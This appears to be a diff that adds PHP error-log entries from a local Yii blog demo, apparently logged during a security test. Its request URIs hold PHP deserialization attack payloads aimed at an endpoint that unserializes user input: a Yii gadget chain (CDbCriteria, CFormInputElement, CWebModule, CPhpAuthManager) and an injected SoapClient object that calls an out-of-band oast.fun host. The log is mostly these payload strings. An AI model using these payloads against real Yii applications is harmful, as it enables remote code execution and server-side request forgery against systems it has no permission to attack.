@@ -8,3 +8,56 @@ Stack trace:
 #5 C:\xampp_5.5\htdocs\yii\framework\base\CApplication.php(180): CWebApplication->processRequest()
 #6 C:\xampp_5.5\htdocs\yii\demos\blog\index.php(11): CWebApplication->run()
 REQUEST_URI=/yii/demos/blog/index.php/UserInput?data=abcd
+2026/01/16 18:59:39 [error] [php] unserialize(): Error at offset 133 of 847 bytes (C:\xampp_5.5\htdocs\yii\demos\blog\protected\controllers\UserInputController.php:8)
+Stack trace:
+#0 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(308): CInlineAction->runWithParams()
+#1 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(286): UserInputController->runAction()
+#2 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(265): UserInputController->runActionWithFilters()
+#3 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(282): UserInputController->run()
+#4 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(141): CWebApplication->runController()
+#5 C:\xampp_5.5\htdocs\yii\framework\base\CApplication.php(180): CWebApplication->processRequest()
+#6 C:\xampp_5.5\htdocs\yii\demos\blog\index.php(11): CWebApplication->run()
+REQUEST_URI=/yii/demos/blog/index.php/UserInput?data=a:1:{i:0;O:11:%22CDbCriteria%22:2:{s:6:%22params%22;a:1:{s:4:%22:ycp%22;s:1:%221%22;}s:9:%22condition%22;O:17:%22CFormInputElement%22:6:{s:14:%22CComponent_m%22;a:1:{i:0;O:9:%22CBehavior%22:1:{s:19:%22CBehavior_enabled%22;b:1;}}s:21:%22CFormElement_parent%22;O:10:%22CWebModule%22:2:{s:14:%22CComponent_m%22;a:1:{i:0;O:5:%22CForm%22:4:{s:14:%22CComponent_m%22;a:1:{i:0;O:9:%22CBehavior%22:1:{s:19:%22CBehavior_enabled%22;b:1;}}s:21:%22CFormElement_parent%22;i:1;s:10:%22attributes%22;a:3:{s:2:%22id%22;s:1:%221%22;s:4:%22name%22;s:1:%221%22;s:5:%22value%22;s:1:%221%22;}s:13:%22CForm_model%22;O:10:%22CFormModel%22:0:{}}}s:25:%22CModule_componentConfig%22;a:1:{s:10:%22showErrors%22;a:2:{s:5:%22class%22;s:15:%22CPhpAuthManager%22;s:8:%22authFile%22;s:29:%22./protected/runtime/state.bin%22;}}}s:10:%22attributes%22;a:3:{s:2:%22id%22;s:1:%221%22;s:4:%22name%22;s:1:%221%22;s:5:%22value%22;s:1:%221%22;}s:25:%22CFormInputElement_label%22;b:0;s:28:%22CFormInputElement_required%22;s:0:%22%22;s:4:%22type%22;s:4:%22file%22;}}}
+2026/01/16 18:59:45 [error] [php] unserialize(): Error at offset 133 of 847 bytes (C:\xampp_5.5\htdocs\yii\demos\blog\protected\controllers\UserInputController.php:8)
+Stack trace:
+#0 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(308): CInlineAction->runWithParams()
+#1 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(286): UserInputController->runAction()
+#2 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(265): UserInputController->runActionWithFilters()
+#3 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(282): UserInputController->run()
+#4 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(141): CWebApplication->runController()
+#5 C:\xampp_5.5\htdocs\yii\framework\base\CApplication.php(180): CWebApplication->processRequest()
+#6 C:\xampp_5.5\htdocs\yii\demos\blog\index.php(11): CWebApplication->run()
+REQUEST_URI=/yii/demos/blog/index.php/UserInput?data=a:1:{i:0;O:11:%22CDbCriteria%22:2:{s:6:%22params%22;a:1:{s:4:%22:ycp%22;s:1:%221%22;}s:9:%22condition%22;O:17:%22CFormInputElement%22:6:{s:14:%22CComponent_m%22;a:1:{i:0;O:9:%22CBehavior%22:1:{s:19:%22CBehavior_enabled%22;b:1;}}s:21:%22CFormElement_parent%22;O:10:%22CWebModule%22:2:{s:14:%22CComponent_m%22;a:1:{i:0;O:5:%22CForm%22:4:{s:14:%22CComponent_m%22;a:1:{i:0;O:9:%22CBehavior%22:1:{s:19:%22CBehavior_enabled%22;b:1;}}s:21:%22CFormElement_parent%22;i:1;s:10:%22attributes%22;a:3:{s:2:%22id%22;s:1:%221%22;s:4:%22name%22;s:1:%221%22;s:5:%22value%22;s:1:%221%22;}s:13:%22CForm_model%22;O:10:%22CFormModel%22:0:{}}}s:25:%22CModule_componentConfig%22;a:1:{s:10:%22showErrors%22;a:2:{s:5:%22class%22;s:15:%22CPhpAuthManager%22;s:8:%22authFile%22;s:29:%22./protected/runtime/state.bin%22;}}}s:10:%22attributes%22;a:3:{s:2:%22id%22;s:1:%221%22;s:4:%22name%22;s:1:%221%22;s:5:%22value%22;s:1:%221%22;}s:25:%22CFormInputElement_label%22;b:0;s:28:%22CFormInputElement_required%22;s:0:%22%22;s:4:%22type%22;s:4:%22file%22;}}}
+2026/01/16 19:00:04 [error] [php] unserialize(): Error at offset 133 of 847 bytes (C:\xampp_5.5\htdocs\yii\demos\blog\protected\controllers\UserInputController.php:8)
+Stack trace:
+#0 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(308): CInlineAction->runWithParams()
+#1 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(286): UserInputController->runAction()
+#2 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(265): UserInputController->runActionWithFilters()
+#3 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(282): UserInputController->run()
+#4 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(141): CWebApplication->runController()
+#5 C:\xampp_5.5\htdocs\yii\framework\base\CApplication.php(180): CWebApplication->processRequest()
+#6 C:\xampp_5.5\htdocs\yii\demos\blog\index.php(11): CWebApplication->run()
+REQUEST_URI=/yii/demos/blog/index.php/UserInput?data=a:1:{i:0;O:11:%22CDbCriteria%22:2:{s:6:%22params%22;a:1:{s:4:%22:ycp%22;s:1:%221%22;}s:9:%22condition%22;O:17:%22CFormInputElement%22:6:{s:14:%22CComponent_m%22;a:1:{i:0;O:9:%22CBehavior%22:1:{s:19:%22CBehavior_enabled%22;b:1;}}s:21:%22CFormElement_parent%22;O:10:%22CWebModule%22:2:{s:14:%22CComponent_m%22;a:1:{i:0;O:5:%22CForm%22:4:{s:14:%22CComponent_m%22;a:1:{i:0;O:9:%22CBehavior%22:1:{s:19:%22CBehavior_enabled%22;b:1;}}s:21:%22CFormElement_parent%22;i:1;s:10:%22attributes%22;a:3:{s:2:%22id%22;s:1:%221%22;s:4:%22name%22;s:1:%221%22;s:5:%22value%22;s:1:%221%22;}s:13:%22CForm_model%22;O:10:%22CFormModel%22:0:{}}}s:25:%22CModule_componentConfig%22;a:1:{s:10:%22showErrors%22;a:2:{s:5:%22class%22;s:15:%22CPhpAuthManager%22;s:8:%22authFile%22;s:29:%22./protected/runtime/state.bin%22;}}}s:10:%22attributes%22;a:3:{s:2:%22id%22;s:1:%221%22;s:4:%22name%22;s:1:%221%22;s:5:%22value%22;s:1:%221%22;}s:25:%22CFormInputElement_label%22;b:0;s:28:%22CFormInputElement_required%22;s:0:%22%22;s:4:%22type%22;s:4:%22file%22;}}}
+2026/01/16 20:03:42 [error] [php] include(SoapClient.php): failed to open stream: No such file or directory (C:\xampp_5.5\htdocs\yii\framework\YiiBase.php:427)
+Stack trace:
+#0 unknown(0): spl_autoload_call()
+#1 C:\xampp_5.5\htdocs\yii\demos\blog\protected\controllers\UserInputController.php(8): unserialize()
+#2 C:\xampp_5.5\htdocs\yii\framework\web\actions\CInlineAction.php(49): UserInputController->actionIndex()
+#3 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(308): CInlineAction->runWithParams()
+#4 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(286): UserInputController->runAction()
+#5 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(265): UserInputController->runActionWithFilters()
+#6 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(282): UserInputController->run()
+#7 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(141): CWebApplication->runController()
+#8 C:\xampp_5.5\htdocs\yii\framework\base\CApplication.php(180): CWebApplication->processRequest()
+#9 C:\xampp_5.5\htdocs\yii\demos\blog\index.php(11): CWebApplication->run()
+REQUEST_URI=/yii/demos/blog/index.php/UserInput?data=O:10:%22SoapClient%22:2:{s:8:%22location%22;s:25:%22http://vgqhiieboykemwyvzisluiow9oa76uiff.oast.fun%22;s:3:%22uri%22;s:3:%22abc%22;}
+2026/01/16 20:11:07 [error] [php] unserialize(): Error at offset 67 of 114 bytes (C:\xampp_5.5\htdocs\yii\demos\blog\protected\controllers\UserInputController.php:8)
+Stack trace:
+#0 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(308): CInlineAction->runWithParams()
+#1 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(286): UserInputController->runAction()
+#2 C:\xampp_5.5\htdocs\yii\framework\web\CController.php(265): UserInputController->runActionWithFilters()
+#3 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(282): UserInputController->run()
+#4 C:\xampp_5.5\htdocs\yii\framework\web\CWebApplication.php(141): CWebApplication->runController()
+#5 C:\xampp_5.5\htdocs\yii\framework\base\CApplication.php(180): CWebApplication->processRequest()
+#6 C:\xampp_5.5\htdocs\yii\demos\blog\index.php(11): CWebApplication->run()
+REQUEST_URI=/yii/demos/blog/index.php/UserInput?data=O:10:%22SoapClient%22:2:{s:8:%22location%22;s:25:%22http://vgqhiieboykemwyvzisluiow9oa76uiff.oast.fun%22;s:3:%22uri%22;s:3:%22abc%22;}
